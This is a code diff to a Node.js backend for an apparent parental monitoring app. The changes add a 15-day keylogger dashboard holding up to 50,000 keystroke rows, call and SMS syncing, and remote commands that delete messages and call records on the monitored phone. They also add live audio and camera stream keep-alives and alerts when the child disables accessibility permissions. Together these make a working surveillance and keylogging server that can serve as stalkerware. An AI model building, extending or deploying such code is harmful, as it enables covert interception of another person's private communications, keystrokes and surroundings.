@@ -21,7 +21,52 @@ const presenceRam = new Map(); // deviceId -> { lastMs, online, name, parentId, 
 const presenceWaiters = []; // { parentId, res, timer, done }
 let presenceDirty = false;
 let presenceSaveTimer = null;
-const ONLINE_MS = 8000; // ~8s miss → OFFLINE (stable on slow 4G); explicit /device/offline is instant
+// Was 8s — caused ONLINE/OFFLINE flapping on mobile even with good internet.
+// Child heartbeats ~2.5s; allow long grace so brief net blips do not flip status.
+const ONLINE_MS = 45000; // 45s without heartbeat → OFFLINE
+const PRESENCE_FLIP_COOLDOWN_MS = 8000; // min time between online↔offline alerts
+
+function ensureTomb(db) {
+  if (!db.deletedSms) db.deletedSms = [];
+  if (!db.deletedCalls) db.deletedCalls = [];
+}
+function smsTomb(db, deviceId, androidId, address, body) {
+  ensureTomb(db);
+  const aid = String(androidId || '');
+  const ad = String(address || '');
+  const bd = String(body || '');
+  if ((db.deletedSms || []).some(t => t.deviceId === deviceId && ((aid && String(t.androidId||'')===aid) || (ad && bd && t.address===ad && t.body===bd)))) return;
+  db.deletedSms.push({ deviceId, androidId: aid, address: ad, body: bd, at: Date.now() });
+  if (db.deletedSms.length > 2000) db.deletedSms = db.deletedSms.slice(-1500);
+}
+function callTomb(db, deviceId, androidId, id, number) {
+  ensureTomb(db);
+  const aid = String(androidId || '');
+  const sid = String(id || '');
+  const num = String(number || '');
+  db.deletedCalls.push({ deviceId, androidId: aid, id: sid, number: num, at: Date.now() });
+  if (db.deletedCalls.length > 2000) db.deletedCalls = db.deletedCalls.slice(-1500);
+}
+function isSmsTomb(db, deviceId, androidId, address, body) {
+  ensureTomb(db);
+  const aid = String(androidId || '');
+  const ad = String(address || '');
+  const bd = String(body || '');
+  return (db.deletedSms || []).some(t => t.deviceId === deviceId && (
+    (aid && String(t.androidId||'') === aid) ||
+    (ad && bd && t.address === ad && t.body === bd)
+  ));
+}
+function isCallTomb(db, deviceId, androidId, number, createdAt) {
+  ensureTomb(db);
+  const aid = String(androidId || '');
+  const num = String(number || '');
+  return (db.deletedCalls || []).some(t => t.deviceId === deviceId && (
+    (aid && (String(t.androidId||'')===aid || String(t.id||'')===aid)) ||
+    (num && t.number === num && aid && String(t.androidId||'')===aid)
+  ));
+}
+
 
 function presenceKey(d) { return String(d.deviceId || d.id || ''); }
 
@@ -69,12 +114,29 @@ function markPresence(d, online, reason) {
   const prev = presenceRam.get(d.deviceId);
   const was = prev ? !!prev.online : (d.online ? true : false);
   const nowMs = Date.now();
+  // Explicit offline (power off) always wins; timeout offline respects cooldown
+  const lastFlip = prev && prev.lastFlipMs ? prev.lastFlipMs : 0;
+  if (!!was !== !!online && reason !== 'power off' && reason !== 'power off / restart') {
+    if (lastFlip && (nowMs - lastFlip) < PRESENCE_FLIP_COOLDOWN_MS && !online) {
+      // Still update lastMs bookkeeping but do not flap OFFLINE during cooldown
+      presenceRam.set(d.deviceId, {
+        lastMs: prev && prev.lastMs ? prev.lastMs : nowMs,
+        online: true,
+        name: d.name,
+        parentId: d.parentId,
+        token: d.childToken,
+        lastFlipMs: lastFlip
+      });
+      return;
+    }
+  }
   presenceRam.set(d.deviceId, {
     lastMs: online ? nowMs : (prev && prev.lastMs ? prev.lastMs : nowMs),
     online: !!online,
     name: d.name,
     parentId: d.parentId,
-    token: d.childToken
+    token: d.childToken,
+    lastFlipMs: (!!was !== !!online) ? nowMs : lastFlip
   });
   if (!!was !== !!online) {
     const db = load();
@@ -84,6 +146,10 @@ function markPresence(d, online, reason) {
     schedulePresenceSave();
     notifyPresenceWaiters(d.parentId);
     console.log("presence", d.name || d.deviceId, online ? "ONLINE" : "OFFLINE", reason || "");
+  } else if (online) {
+    // Refresh lastMs without alert
+    const cur = presenceRam.get(d.deviceId);
+    if (cur) cur.lastMs = nowMs;
   }
 }
 
@@ -123,7 +189,7 @@ function sweepPresence() {
     if (changed) schedulePresenceSave();
   } catch (e) {}
 }
-setInterval(sweepPresence, 2000);
+setInterval(sweepPresence, 5000);
 
 const DATA = path.join(__dirname, 'data');
 const MEDIA = path.join(__dirname, 'media');
@@ -349,7 +415,7 @@ const server = http.createServer(async (req, res) => {
     let pathname = u.pathname.replace(/\/+$/, '') || '/';
     // Health FIRST - never block on body/db
     if (pathname === '/health' || pathname === '/') {
-      return send(res, 200, { ok: true, phase: 89, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, gallery: true, files: true, music: true });
+      return send(res, 200, { ok: true, phase: 106, store: 'json-file', web: true, snapshots: true, recordings: true, sms: true, map: true, live: true, liveFix: true, gallery: true, files: true, music: true });
     }
     const q = Object.fromEntries(u.searchParams.entries());
     let body = {};
@@ -438,7 +504,7 @@ const server = http.createServer(async (req, res) => {
     // Pairing
     // Permanent family code: child enters parent's fixed familyCode -> new device is created under that parent.
     // Old one-time pairingCode still works for backward compatibility.
-    if (pathname === '/pair/create' && req.method === 'POST') {
+    if ((pathname === '/pair/create' || pathname === '/device/pair-code' || pathname === '/pair/code') && req.method === 'POST') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { error: 'unauthorized' });
       const db = load();
@@ -447,7 +513,7 @@ const server = http.createServer(async (req, res) => {
       save(db);
       return send(res, 200, { ok: true, pairingCode: familyCode, code: familyCode, familyCode, permanent: true });
     }
-    if (pathname === '/pair/claim' && req.method === 'POST') {
+    if ((pathname === '/pair/claim' || pathname === '/device/claim' || pathname === '/pair/join') && req.method === 'POST') {
       const db = load();
       const code = String(body.pairingCode || body.code || '').trim();
       const name = String(body.name || body.childName || 'Child').trim() || 'Child';
@@ -544,7 +610,7 @@ const server = http.createServer(async (req, res) => {
         };
       });
       if (dirty) { try { save(db); } catch (e) {} }
-      return send(res, 200, { devices: list, phase: 89 });
+      return send(res, 200, { devices: list, phase: 106 });
     }
 
     if ((pathname === '/presence' || pathname === '/presence/status') && req.method === 'GET') {
@@ -568,7 +634,7 @@ const server = http.createServer(async (req, res) => {
           battery: d.battery, charging: d.charging ? 1 : 0, netType: d.netType || ''
         };
       });
-      return send(res, 200, { ok: true, devices, ts: nowMs, onlineMs: ONLINE_MS, phase: 89 });
+      return send(res, 200, { ok: true, devices, ts: nowMs, onlineMs: ONLINE_MS, phase: 106 });
     }
     if (pathname === '/presence/wait' && req.method === 'GET') {
       const p = parentOf(body, q, req.headers);
@@ -622,7 +688,7 @@ const server = http.createServer(async (req, res) => {
         schedulePresenceSave();
         if (wasOff) { try { save(db); } catch (e) {} }
       }
-      return send(res, 200, { ok: true, battery: x && x.battery, charging: x && x.charging, online: 1, phase: 89 });
+      return send(res, 200, { ok: true, battery: x && x.battery, charging: x && x.charging, online: 1, phase: 106 });
     }
     if ((pathname === '/device/offline' || pathname === '/child/offline') && req.method === 'POST') {
       const d = childOf(body, q, req.headers);
@@ -635,7 +701,7 @@ const server = http.createServer(async (req, res) => {
         x.online = 0;
         try { save(db); } catch (e) {}
       }
-      return send(res, 200, { ok: true, online: 0, phase: 89 });
+      return send(res, 200, { ok: true, online: 0, phase: 106 });
     }
 
     if (pathname === '/location/update' && req.method === 'POST') {
@@ -730,6 +796,24 @@ const server = http.createServer(async (req, res) => {
       return send(res, 200, { ok: true, days, count: points.length, points, locations: points });
     }
 
+
+    if ((pathname === '/events/alert' || pathname === '/events/accessibility') && req.method === 'POST') {
+      const d = childOf(body, q, req.headers);
+      if (!d) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      if (!db.alerts) db.alerts = [];
+      db.alerts.push({
+        id: rid(), deviceId: d.deviceId, parentId: d.parentId,
+        type: body.type || 'ACCESSIBILITY_OFF',
+        message: body.message || 'Child protection permission changed',
+        accessibilityOn: body.accessibilityOn,
+        notificationListenerOn: body.notificationListenerOn,
+        createdAt: now(), read: false
+      });
+      if (db.alerts.length > 400) db.alerts = db.alerts.slice(-250);
+      save(db);
+      return send(res, 200, { ok: true, phase: 106 });
+    }
 
     if ((pathname === '/events/notification' || pathname === '/notifications/push') && req.method === 'POST') {
       const d = childOf(body, q, req.headers);
@@ -891,12 +975,28 @@ const server = http.createServer(async (req, res) => {
         seen.add(key);
         uniq.push(x);
       });
-      return send(res, 200, { sms: uniq.slice(0, 300) });
+      return send(res, 200, { sms: uniq.slice(0, 400) });
     }
+
+    if ((pathname === '/calls' || pathname === '/call-log') && req.method === 'GET') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const list = (load().calls || []).filter(x => x.deviceId === q.deviceId)
+        .sort((a, b) => (Number(b.startedAt) || Date.parse(b.createdAt || 0) || 0) - (Number(a.startedAt) || Date.parse(a.createdAt || 0) || 0));
+      const seen = new Set();
+      const uniq = [];
+      list.forEach(x => {
+        const key = x.androidId ? ('id:' + x.androidId) : ('n:' + (x.number||'') + '|' + (x.direction||'') + '|' + (x.createdAt||''));
+        if (seen.has(key)) return;
+        seen.add(key);
+        uniq.push(x);
+      });
+      return send(res, 200, { calls: uniq.slice(0, 500) });
+    }
+
 
     // Generic list helpers for parent GET
     const parentGetMap = {
-      '/calls': 'calls', '/contacts': 'contacts', '/keystrokes': 'keystrokes',
+      '/contacts': 'contacts', '/keystrokes': 'keystrokes',
       '/browsing/history': 'browsing', '/driving': 'driving', '/activity': 'activity',
       '/locations': 'locations', '/rules': 'rules', '/website/rules': 'websiteRules',
       '/downtime': 'downtime', '/geofence': 'geofences', '/image-scan': 'imageFlags',
@@ -913,7 +1013,17 @@ const server = http.createServer(async (req, res) => {
         list = list.filter(s => ids.has(s.deviceId));
       } else list = list.filter(x => x.deviceId === q.deviceId);
       const outKey = pathname === '/browsing/history' ? 'history' : pathname === '/driving' ? 'events' : pathname === '/sos' ? 'events' : pathname === '/activity' ? 'events' : pathname === '/image-scan' ? 'flags' : pathname === '/website/rules' ? 'rules' : pathname === '/data-usage' ? 'usage' : pathname === '/geofence' ? 'geofences' : key.replace(/^\//, '') || key;
-      let out = list.slice(-200).reverse();
+      let out;
+      if (pathname === '/keystrokes') {
+        // 15-day keylogger dashboard — newest first, up to 8000 rows
+        out = list.slice().sort((a, b) => {
+          const am = a.createdMs || Date.parse(String(a.createdAt || '')) || 0;
+          const bm = b.createdMs || Date.parse(String(b.createdAt || '')) || 0;
+          return bm - am;
+        }).slice(0, 8000);
+      } else {
+        out = list.slice(-200).reverse();
+      }
       if (pathname === '/sos') {
         out = out.map(x => ({
           id: x.id, deviceId: x.deviceId, message: x.message || x.note || '',
@@ -937,6 +1047,10 @@ const server = http.createServer(async (req, res) => {
     // Child POST logs
     const childPost = {
       '/calls/sync': (db, d, b) => {
+        ensureTomb(db);
+        if (b.replaceAll === true || b.replaceAll === 1) {
+          db.calls = (db.calls || []).filter(x => x.deviceId !== d.deviceId);
+        }
         const items = b.items || b.calls || [];
         items.forEach(c => {
           const started = c.startedAt || c.date || c.createdAt || Date.now();
@@ -946,8 +1060,8 @@ const server = http.createServer(async (req, res) => {
           const number = String(c.number || c.address || c.phoneNumber || c.phone || '');
           const direction = String(c.direction || c.type || '');
           const duration = Number(c.durationSeconds != null ? c.durationSeconds : (c.duration || 0)) || 0;
-          // dedupe same call
           const androidId = String(c.androidId || c.callId || '');
+          if (isCallTomb(db, d.deviceId, androidId, number, createdAt)) return;
           const exists = db.calls.find(x => x.deviceId === d.deviceId && (
             (androidId && String(x.androidId || '') === androidId) ||
             (x.number === number && String(x.direction) === direction && String(x.createdAt) === createdAt)
@@ -958,18 +1072,22 @@ const server = http.createServer(async (req, res) => {
               direction, duration, durationSeconds: duration,
               createdAt, startedAt: started
             });
-          } else if (androidId && !exists.androidId) {
-            exists.androidId = androidId;
+          } else {
+            if (androidId && !exists.androidId) exists.androidId = androidId;
+            exists.duration = duration;
+            exists.durationSeconds = duration;
+            exists.name = c.name || exists.name || '';
           }
         });
-        // keep last 500 per device
-        const mine = db.calls.filter(x => x.deviceId === d.deviceId);
-        if (mine.length > 500) {
-          const drop = new Set(mine.slice(0, mine.length - 500).map(x => x.id));
-          db.calls = db.calls.filter(x => x.deviceId !== d.deviceId || !drop.has(x.id));
+        const mine = (db.calls || []).filter(x => x.deviceId === d.deviceId)
+          .sort((a,b) => (Number(a.startedAt)||Date.parse(a.createdAt)||0) - (Number(b.startedAt)||Date.parse(b.createdAt)||0));
+        if (mine.length > 800) {
+          const keep = new Set(mine.slice(-800).map(x => x.id));
+          db.calls = db.calls.filter(x => x.deviceId !== d.deviceId || keep.has(x.id));
         }
       },
       '/sms/sync': (db, d, b) => {
+        ensureTomb(db);
         if (b.replaceAll === true || b.replaceAll === 1) {
           db.sms = (db.sms || []).filter(x => x.deviceId !== d.deviceId);
         }
@@ -996,6 +1114,7 @@ const server = http.createServer(async (req, res) => {
           const androidId = String(m.androidId || m.smsId || '');
           const address = String(m.address || m.number || '');
           const body = String(m.body || m.message || '');
+          if (isSmsTomb(db, d.deviceId, androidId, address, body)) return;
           const direction = normDir(m.direction || m.type);
           let ms = whenMs(m);
           if (!ms) ms = Date.now();
@@ -1029,49 +1148,113 @@ const server = http.createServer(async (req, res) => {
         }
       },
       '/contacts/sync': (db, d, b) => {
-        if (b.replaceAll === true || b.replaceAll === 1 || (b.replaceAll !== false && b.replaceAll !== 0 && !b.append)) {
-          if (b.replaceAll !== false) db.contacts = db.contacts.filter(c => c.deviceId !== d.deviceId);
+        const doReplace = b.replaceAll === true || b.replaceAll === 1 ||
+          (b.replaceAll !== false && b.replaceAll !== 0 && !b.append);
+        if (doReplace) {
+          db.contacts = (db.contacts || []).filter(c => c.deviceId !== d.deviceId);
         }
         (b.items || b.contacts || []).forEach(c => {
           let number = c.number || '';
           if (!number && Array.isArray(c.phones) && c.phones[0]) {
             number = typeof c.phones[0] === 'object' ? (c.phones[0].number || '') : String(c.phones[0]);
           }
+          number = String(number || '');
           const contactId = String(c.contactId || c.id || '');
+          const name = c.name || '';
+          // Dedupe: same device + contactId OR same number+name
+          const hit = (db.contacts || []).find(x => x.deviceId === d.deviceId && (
+            (contactId && String(x.contactId || '') === contactId) ||
+            (number && x.number === number && String(x.name || '') === String(name))
+          ));
+          if (hit) {
+            hit.name = name || hit.name;
+            hit.number = number || hit.number;
+            if (contactId) hit.contactId = contactId;
+            hit.phones = Array.isArray(c.phones) ? c.phones : (number ? [{ number }] : (hit.phones || []));
+            return;
+          }
           db.contacts.push({
             id: rid(), deviceId: d.deviceId,
-            contactId, name: c.name || '', number: String(number || ''),
-            phones: Array.isArray(c.phones) ? c.phones : (number ? [{ number: String(number) }] : [])
+            contactId, name, number,
+            phones: Array.isArray(c.phones) ? c.phones : (number ? [{ number }] : [])
           });
         });
       },
       '/keystrokes/log': (db, d, b) => {
+        if (!db.keystrokes) db.keystrokes = [];
         const pushOne = (pkg, text, ts) => {
           if (!text || !String(text).trim()) return;
+          let createdAt = now();
+          let createdMs = Date.now();
+          try {
+            if (typeof ts === 'number') {
+              // Guard: reject tiny/invalid epoch (e.g. "1" from bad client line)
+              createdMs = (ts > 1e11) ? ts : Date.now();
+              createdAt = new Date(createdMs).toISOString();
+            } else if (ts) {
+              const p = Date.parse(String(ts));
+              if (!isNaN(p) && p > 1e11) { createdMs = p; createdAt = new Date(p).toISOString(); }
+            }
+          } catch (e) {}
           db.keystrokes.push({
             id: rid(), deviceId: d.deviceId,
             packageName: pkg || '',
-            text: String(text).slice(0, 2000),
-            createdAt: ts || now()
+            text: String(text).slice(0, 4000),
+            createdAt,
+            createdMs
           });
         };
         if (Array.isArray(b.items)) {
-          b.items.forEach(k => { if (k) pushOne(k.packageName, k.text, k.createdAt); });
+          b.items.forEach(k => {
+            if (!k) return;
+            pushOne(k.packageName, k.text, k.createdMs || k.createdAt || k.ts);
+          });
         } else if (b.text) {
           // Child sends batch lines: ts\tpkg\ttext
           String(b.text).split(/\n/).forEach(line => {
             const parts = line.split('\t');
-            if (parts.length >= 3) pushOne(parts[1], parts.slice(2).join('\t'), parts[0] ? new Date(Number(parts[0])||Date.now()).toISOString() : now());
-            else if (line.trim()) pushOne(b.packageName || '', line.trim(), now());
+            if (parts.length >= 3) {
+              const ms = Number(parts[0]) || Date.now();
+              pushOne(parts[1], parts.slice(2).join('\t'), ms);
+            } else if (line.trim()) pushOne(b.packageName || '', line.trim(), Date.now());
           });
         } else if (b.packageName) {
-          pushOne(b.packageName, b.text || '', now());
+          pushOne(b.packageName, b.text || '', Date.now());
         }
-        // keep last 2000 only
-        if (db.keystrokes.length > 2000) db.keystrokes = db.keystrokes.slice(-2000);
+        // 15-day retention + hard cap
+        const cut = Date.now() - 15 * 24 * 60 * 60 * 1000;
+        db.keystrokes = db.keystrokes.filter(k => {
+          const ms = k.createdMs || Date.parse(String(k.createdAt || '')) || 0;
+          return !ms || ms >= cut;
+        });
+        if (db.keystrokes.length > 50000) db.keystrokes = db.keystrokes.slice(-50000);
       },
       '/browsing/log': (db, d, b) => { db.browsing.push({ id: rid(), deviceId: d.deviceId, url: b.url || '', createdAt: now() }); },
-      '/activity/log': (db, d, b) => { db.activity.push({ id: rid(), deviceId: d.deviceId, event: b.event || '', detail: b.detail || '', createdAt: now() }); },
+      '/activity/log': (db, d, b) => {
+        if (!db.activity) db.activity = [];
+        const pushAct = (event, pkg, detail, ts) => {
+          db.activity.push({
+            id: rid(), deviceId: d.deviceId,
+            event: event || '',
+            packageName: pkg || '',
+            detail: String(detail || '').slice(0, 1000),
+            createdAt: (typeof ts === 'number') ? new Date(ts).toISOString() : (ts || now()),
+            createdMs: typeof ts === 'number' ? ts : (Date.parse(String(ts || '')) || Date.now())
+          });
+        };
+        if (b.events) {
+          String(b.events).split(/\n/).forEach(line => {
+            const parts = line.split('\t');
+            if (parts.length >= 4) {
+              const ms = Number(parts[0]) || Date.now();
+              pushAct(parts[1], parts[2], parts.slice(3).join('\t'), ms);
+            } else if (line.trim()) pushAct(b.event || 'EVENT', b.packageName || '', line.trim(), Date.now());
+          });
+        } else {
+          pushAct(b.event || '', b.packageName || '', b.detail || b.text || '', Date.now());
+        }
+        if (db.activity.length > 20000) db.activity = db.activity.slice(-20000);
+      },
       '/driving/event': (db, d, b) => {
         const speed = Number(b.speedKmh != null ? b.speedKmh : (b.speed != null ? b.speed : 0)) || 0;
         const lat = Number(b.latitude != null ? b.latitude : (b.lat != null ? b.lat : 0)) || 0;
@@ -1105,6 +1288,13 @@ const server = http.createServer(async (req, res) => {
     if (req.method === 'POST' && pathname === '/usage') pathname = '/usage/sync';
     if (req.method === 'POST' && pathname === '/calls') pathname = '/calls/sync';
     if (req.method === 'POST' && pathname === '/contacts') pathname = '/contacts/sync';
+    // CallMonitorReceiver posts single call events to calls/log (was 404)
+    if (req.method === 'POST' && pathname === '/calls/log') {
+      pathname = '/calls/sync';
+      if (!body.items && !body.calls && (body.number || body.direction)) {
+        body = Object.assign({}, body, { items: [body], replaceAll: false });
+      }
+    }
 
     if (req.method === 'POST' && childPost[pathname]) {
       const d = childOf(body, q, req.headers);
@@ -1272,14 +1462,17 @@ const server = http.createServer(async (req, res) => {
       const number = String(body.number || '');
       const db = load();
       const before = (db.calls || []).length;
+      const androidId = String(body.androidId || body.callId || '');
       db.calls = (db.calls || []).filter(x => {
         if (deviceId && x.deviceId !== deviceId) return true;
-        if (id && String(x.id) === id) return false;
+        if (id && (String(x.id) === id || String(x.androidId||'') === id)) return false;
+        if (androidId && String(x.androidId||'') === androidId) return false;
         return true;
       });
+      callTomb(db, deviceId, androidId || id, id, number);
       db.commands.push({
         id: rid(), deviceId, command: 'call_delete',
-        payload: { id, number, androidId: body.androidId || '' }, status: 'PENDING', createdAt: now()
+        payload: { id, number, androidId: androidId || id }, status: 'PENDING', createdAt: now()
       });
       save(db);
       return send(res, 200, { ok: true, removed: before - db.calls.length });
@@ -1339,17 +1532,22 @@ const server = http.createServer(async (req, res) => {
       const androidIds = [].concat(body.androidIds || [], body.androidId ? [body.androidId] : []).map(String);
       const deviceId = body.deviceId || q.deviceId;
       const before = (db.sms || []).length;
+      const address = String(body.address || body.number || '');
+      const smsBody = String(body.body || body.message || '');
       db.sms = (db.sms || []).filter(x => {
         if (deviceId && x.deviceId !== deviceId) return true;
         if (ids.includes(String(x.id))) return false;
         if (androidIds.includes(String(x.androidId || ''))) return false;
+        if (address && smsBody && String(x.address||'')===address && String(x.body||'')===smsBody) return false;
         return true;
       });
-      // also queue remote delete on child if possible
-      if (deviceId && (ids.length || androidIds.length)) {
+      ids.forEach(i => smsTomb(db, deviceId, i, address, smsBody));
+      androidIds.forEach(i => smsTomb(db, deviceId, i, address, smsBody));
+      if (address || smsBody) smsTomb(db, deviceId, androidIds[0] || ids[0] || '', address, smsBody);
+      if (deviceId && (ids.length || androidIds.length || address)) {
         db.commands.push({
           id: rid(), deviceId, command: 'sms_delete',
-          payload: { ids, androidIds, androidId: androidIds[0] || '' },
+          payload: { ids, androidIds, androidId: androidIds[0] || ids[0] || '', address, body: smsBody, number: address },
           status: 'PENDING', createdAt: now()
         });
       }
@@ -1527,7 +1725,7 @@ const server = http.createServer(async (req, res) => {
         return true;
       });
       toDel.forEach(k => liveLatest.delete(k));
-      return send(res, 200, { ok: true, cleared: toDel.length, phase: 89 });
+      return send(res, 200, { ok: true, cleared: toDel.length, phase: 106 });
     }
 
     if (pathname === '/media/upload' && req.method === 'POST') {
@@ -1601,12 +1799,36 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true, id, kind: kindU, live: true });
       }
       const db = load();
+      // Debounce: same device + kind snapshot within 4s -> replace, don't multiply 7-8 copies
+      if (manualSnap || scheduled) {
+        const recent = (db.media || []).filter(m =>
+          m.deviceId === d.deviceId
+          && String(m.kind || '').toUpperCase() === kindU
+          && (m.source === 'MANUAL' || m.scheduled || m.source === 'SCHEDULED')
+          && (createdMs - (m.createdMs || 0)) < 4000
+        );
+        if (recent.length > 0) {
+          recent.forEach(m => {
+            try { if (m.path && fs.existsSync(m.path)) fs.unlinkSync(m.path); } catch (e) {}
+          });
+          const ridSet = new Set(recent.map(m => m.id));
+          db.media = db.media.filter(m => !ridSet.has(m.id));
+        }
+      }
       db.media.push({
         id, deviceId: d.deviceId, kind: kindU, path: filePath,
         createdAt, createdMs, scheduled: scheduled || manualSnap,
         source: isLive ? 'LIVE' : (scheduled ? 'SCHEDULED' : 'MANUAL'),
         requestId: body.requestId || q.req || null
       });
+      // Cap snapshots per device
+      const snaps = db.media.filter(m => m.deviceId === d.deviceId && m.source !== 'LIVE');
+      if (snaps.length > 120) {
+        const drop = snaps.slice(0, snaps.length - 120);
+        const dropIds = new Set(drop.map(m => m.id));
+        drop.forEach(m => { try { if (m.path && fs.existsSync(m.path)) fs.unlinkSync(m.path); } catch (e) {} });
+        db.media = db.media.filter(m => !dropIds.has(m.id));
+      }
       const liveRows = db.media.filter(m => m.deviceId === d.deviceId && m.source === 'LIVE');
       if (liveRows.length > 8) {
         const dropLive = liveRows.slice(0, liveRows.length - 8);
@@ -1673,8 +1895,12 @@ const server = http.createServer(async (req, res) => {
 
       const keepAlive = setInterval(() => {
         if (!writer.alive || res.writableEnded) { try { clearInterval(keepAlive); } catch (e) {} return; }
-        try { res.write(isAudio ? '' : ''); } catch (e) { writer.alive = false; }
-      }, 10000);
+        try {
+          // Touch socket so proxies (Railway) do not idle-drop continuous live
+          if (isAudio) res.write('PCM\n0\n' + Date.now() + '\n');
+          else res.write('--frame\r\nContent-Type: text/plain\r\nContent-Length: 0\r\n\r\n\r\n');
+        } catch (e) { writer.alive = false; }
+      }, 8000);
 
       req.on('close', () => {
         writer.alive = false;
@@ -1817,7 +2043,8 @@ const server = http.createServer(async (req, res) => {
       }
       // LIVE/raw: ONLY in-memory frames fresher than 8 seconds.
       // Never return old disk JPEG (that was the permanent first-frame bug).
-      const maxAge = wantRaw ? 15000 : 30000;
+      // Audio chunks are small/frequent — allow 20s freshness for LIVE_AUDIO
+      const maxAge = (core.indexOf('AUDIO') >= 0) ? 20000 : (wantRaw ? 15000 : 30000);
       for (const k of memKeys) {
         const mem = liveLatest.get(k);
         if (mem && mem.b64 && mem.b64.length > 0) {
@@ -1865,21 +2092,49 @@ const server = http.createServer(async (req, res) => {
     }
     if (pathname === '/media/history' && req.method === 'GET') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
-      let list = load().media.filter(m => m.deviceId === q.deviceId);
+      let list = load().media.filter(m => m.deviceId === q.deviceId && m.source !== 'LIVE' && m.path);
       if (q.kind) {
         const k = String(q.kind).toUpperCase();
         list = list.filter(m => String(m.kind || '').toUpperCase().indexOf(k) >= 0 || String(m.kind || '').toUpperCase() === k);
       }
-      return send(res, 200, {
-        history: list.slice(-400).reverse().map(m => ({
-          id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs || 0,
-          hasFile: !!(m.path), scheduled: !!m.scheduled, source: m.source || ''
-        })),
-        items: list.slice(-400).reverse().map(m => ({
-          id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs || 0,
-          source: m.source || (m.scheduled ? 'SCHEDULED' : ''), title: m.kind
-        }))
-      });
+      // Dedupe near-identical snapshots (same kind within 3s)
+      list.sort((a, b) => (a.createdMs || 0) - (b.createdMs || 0));
+      const deduped = [];
+      for (let i = 0; i < list.length; i++) {
+        const m = list[i];
+        const prev = deduped.length ? deduped[deduped.length - 1] : null;
+        if (prev
+          && String(prev.kind || '') === String(m.kind || '')
+          && Math.abs((m.createdMs || 0) - (prev.createdMs || 0)) < 3000) {
+          continue;
+        }
+        deduped.push(m);
+      }
+      const out = deduped.slice(-400).reverse().map(m => ({
+        id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs || 0,
+        hasFile: !!(m.path), scheduled: !!m.scheduled, source: m.source || ''
+      }));
+      return send(res, 200, { history: out, items: out.map(m => ({ id: m.id, kind: m.kind, createdAt: m.createdAt, createdMs: m.createdMs, source: m.source, title: m.kind })) });
+    }
+    if (pathname === '/media/delete' && req.method === 'POST') {
+      const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
+      const db = load();
+      let ids = body.ids || body.id || q.id;
+      if (!Array.isArray(ids)) ids = ids ? [ids] : [];
+      ids = ids.map(String).filter(Boolean);
+      let deleted = 0;
+      const idSet = new Set(ids);
+      const keep = [];
+      for (let i = 0; i < (db.media || []).length; i++) {
+        const m = db.media[i];
+        if (idSet.has(String(m.id)) && String(m.deviceId) === String(body.deviceId || q.deviceId || m.deviceId)) {
+          try { if (m.path && fs.existsSync(m.path)) fs.unlinkSync(m.path); } catch (e) {}
+          deleted++;
+        } else keep.push(m);
+      }
+      db.media = keep;
+      save(db);
+      return send(res, 200, { ok: true, deleted });
     }
     if (pathname === '/usage' && req.method === 'GET') {
       const p = parentOf(body, q, req.headers); if (!p) return send(res, 401, { error: 'unauthorized' });
@@ -2140,7 +2395,8 @@ const server = http.createServer(async (req, res) => {
       if (latest.path && fs.existsSync(latest.path)) {
         const stt = fs.statSync(latest.path);
         // only inline if under 6MB
-        if (stt.size <= 6 * 1024 * 1024) {
+        // Inline up to 12MB so full-quality photos open on parent without extra download hop
+        if (stt.size <= 12 * 1024 * 1024) {
           data = fs.readFileSync(latest.path).toString('base64');
         }
       }
